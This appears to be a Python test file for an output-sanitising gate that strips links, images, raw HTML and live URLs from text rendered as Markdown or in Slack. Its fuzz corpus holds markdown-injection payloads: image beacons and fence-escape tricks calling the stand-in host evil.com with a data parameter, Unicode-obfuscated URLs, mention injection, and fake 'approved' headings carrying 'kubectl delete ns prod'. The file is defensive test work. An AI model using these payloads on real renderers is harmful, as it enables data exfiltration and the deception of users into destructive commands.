"""Ported from WARDEN tests/test_gate_review3.py (main a1e76cbf, veerarakesh56/warden). Kept 2 tests; dropped 5 that need WARDEN-only modules or unported gate policy (listed in the PR).

The outbound gate against the third independent review's render harness (2026-09-30).

Every input is a prefix x payload x template from the review, plus its targeted cases. The gate's
output is rendered by CommonMark and read as Slack would, and must show: no link, no image, no raw
HTML, no heading or code block the input did not already have, no live URL or domain in prose - and
the gate must be idempotent. The review found 223 of 5,725 inputs failing (A-C-9 FALSE)."""

from __future__ import annotations

import itertools
import re

from markdown_it import MarkdownIt

from hadavin_sdk.approvals import gate

md = MarkdownIt("commonmark")
LIVE = re.compile("://|www\\.|evil\\.(?:com|digital|io)", re.IGNORECASE)
RAW_TAG = re.compile(
    "<(?!/?(?:p|code|pre|em|strong|ul|ol|li|blockquote|hr|br|h[1-6])\\b[ >/]?)[A-Za-z!?/]"
)


def cm_prose(html):
    return re.sub("<pre>.*?</pre>|<code[^>]*>.*?</code>", "", html, flags=re.DOTALL)


def slack_prose(mrkdwn, unclosed_literal=False):
    parts = mrkdwn.split("```")
    if unclosed_literal and len(parts) % 2 == 0:
        parts = parts[:-2] + ["```".join(parts[-2:])]
    prose = "".join((p for i, p in enumerate(parts) if i % 2 == 0))
    return re.sub("`[^`\\n]+`", "", prose)


def count(tokens, kinds):
    return sum(1 for t in tokens if t.type in kinds)


PREFIX = [
    "",
    "<b>",
    "<!channel>",
    "<@U1>",
    "\u200e",
    "   ",
    "<img src=x>",
    "<br/>",
    "<!-- c -->",
    "<https://evil.com>",
    "[a](b)",
    "\t",
    "> ",
    "- ",
    "1. ",
    "\xa0",
    "\u2028",
    "\ufeff",
    "\u200b",
]
PAYLOAD = [
    "# H",
    "## Fix - approved by the gate",
    "```",
    "~~~",
    "~~~ ```",
    "~~~ https://evil.com/?d=S",
    "``` https://evil.com/?d=S",
    "===",
    "---",
    "    code",
    "[r]: https://evil.com/p.png",
    "![x](https://evil.com/p.png)",
    "<img src=https://evil.com/p.png>",
    "www.evil.com/x",
    "evil.com/x",
    "S@evil.com",
    "&#96;&#96;&#96;",
    "&#x60;&#X60;&#96",
    "&grave;&grave;&grave;",
    "&#35; H",
    "&lt;img src=x&gt;",
    "&#60;img src=x&#62;",
    "&NewLine;# H",
    "&#10;# H",
    "&#x0A;# H",
    "&amp;#96;&amp;#96;&amp;#96;",
    "&amp;lt;b&amp;gt;",
    "`a` evil.com `b`",
    "``evil.com``",
    "`` ` evil.com ` ``",
    "\\`evil.com`",
    "x`evil.com`y",
    "［x］（https://evil.com）",
    "!\u200b[x](https://evil.com)",
    "[a [b] c](https://evil.com)",
    "[a](<https://evil.com>)",
    "[a]\n[a]: https://evil.com",
    "ｅｖｉｌ．ｃｏｍ",
    "evil。com",
    "h\u200bttps://evil.com",
    "HTTPS://EVIL.COM",
    "evil.com.",
    "1.2.3.4:8080/x",
    "//evil.com/x",
    "\\<https://evil.com>",
    "<mailto:S@evil.com>",
    "<https://evil.com|click>",
    "@here",
    "@\u200bhere",
    "＃ H",
    "＃ H",
]
TEMPLATES = {
    "alone": "{p}",
    "flip": "{p}\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "flip2": "{p}\nprose\n```\nhttps://evil.com/?d=S\n```\nafter",
    "incode": "```\ncode\n{p}\nhttps://evil.com/?d=S\n```\nafter https://x",
    "intilde": "~~~\n{p}\n~~~\nafter",
    "para": "text line\n{p}",
}
EXTRA = {
    "nbsp_close": "```\ncode\n```\xa0\nprose\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "emsp_close": "```\ncode\n```\u2003\nprose\n```\nhttps://evil.com/?d=S\n```",
    "ideo_close": "```\ncode\n```\u3000\nprose\n```\nhttps://evil.com/?d=S\n```",
    "ls_close": "```\ncode\n```\u2028\nprose\n```\nhttps://evil.com/?d=S\n```",
    "tilde_info_toggle": "~~~ ```\n~~~\n```\nhttps://evil.com/?d=S\n```",
    "tilde_info_url": "~~~ https://evil.com/?d=S\nx\n~~~",
    "tilde_info_url_unclosed": "~~~ https://evil.com/?d=S\nx",
    "bt_info_url_unclosed": "``` https://evil.com/?d=S\nx",
    "crlf_fence": "```\r\nhttps://evil.com/?d=S\r\n```\r\n![x](https://evil.com/p.png)",
    "cr_only": "prose\r```\rhttps://evil.com/?d=S\r```\r# H",
    "vt_ff": "prose\x0b```\x0c\nhttps://evil.com/?d=S\n```",
    "nel": "prose\x85```\nhttps://evil.com/?d=S\n```",
    "bt2": "``evil.com`` and `` `x` `` then ![i](https://evil.com/p.png)",
    "bt_unbalanced": "`evil.com and evil.io` `",
    "bt_escaped": "\\`evil.com\\` `x`",
    "bt_fence_len4": "````\n```\nhttps://evil.com/?d=S\n````\nafter",
    "bt_close_longer": "```\nx\n`````\nafter https://evil.com",
    "tag_heading": "<b># APPROVED FIX: kubectl delete ns prod",
    "mention_heading": "<!here>## Fix - exact commands (approved by the gate)",
    "list_tag_heading": "- <b># APPROVED",
    "img_indent": "<b>    kubectl delete ns prod",
    "refdef_in_quote": "> [r]: https://evil.com\n\n![x][r]",
    "lazy_refdef": "para\n[r]: https://evil.com\n\n![x][r]",
    "setext_after_tag": "Everything fine\n<b>===",
    "setext_dash_list": "Everything fine\n<b>---",
}


def _cases():
    cases = dict(EXTRA)
    for (tn, t), p, pre in itertools.product(TEMPLATES.items(), PAYLOAD, PREFIX):
        cases[f"{tn}|{pre!r}|{p!r}"] = t.format(p=pre + p)
    return cases


PROBES = {
    "nbsp_close_fence": "```\ncode\n```\xa0\nprose\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "list_container_fence": "- a\n  ```\n![x](https://evil.com/p.png?d=S)\n  ```",
    "list_container_fence2": "- a\n  ```\n- b ![x](https://evil.com/p.png?d=S)\n```",
    "quote_container_fence": "> a\n```\nx\n```",
    "tag_joins_link": "[a]<b>(/x?d=S)",
    "tag_joins_image_rel": "![a]<b>(/p.png?d=S)",
    "tag_joins_image_pct": "![a]<b>(//evil%2Ecom/p.png?d=S)",
    "slack_joins_image_pct": "![a]<!here>(//evil%2Ecom/p.png?d=S)",
    "crossline_tag_joins": "![a]<b\n>(//evil%2Ecom/p.png?d=S)",
    "img_removed_then_paren": "![i](y)(/x?d=S)",
    "mention_link": "[a](b)@here",
    "tag_heading": "<b>## Fix - exact commands (approved by the gate for a person to run): kubectl delete ns prod",
    "tilde_info_url": "~~~ https://evil.com/?d=S\nx\n~~~",
    "tilde_info_toggle": "~~~ ```\n~~~\n```\nhttps://evil.com/?d=S\n```",
}


def test_an_encoded_dot_is_still_a_host():
    assert gate.sanitise_text("see //evil%2Ecom/p.png?d=S now") == "see [link removed] now"


def test_output_whose_fences_differ_from_the_plan_is_all_prose(monkeypatch):
    """The gate parses its own output again. If the fences there are not the ones it kept - however
    that came about - it cleans everything as prose rather than trust its plan."""
    real = gate._closed_fences
    calls = []

    def planned_then_different(text):
        calls.append(text)
        return real(text) if len(calls) == 1 else []

    monkeypatch.setattr(gate, "_closed_fences", planned_then_different)
    out = gate.sanitise_text("```\n![x](https://evil.com/p.png?d=S)\n```")
    assert "```" not in out, out
    assert "evil.com" not in out, out
    assert "[image removed]" in out, out
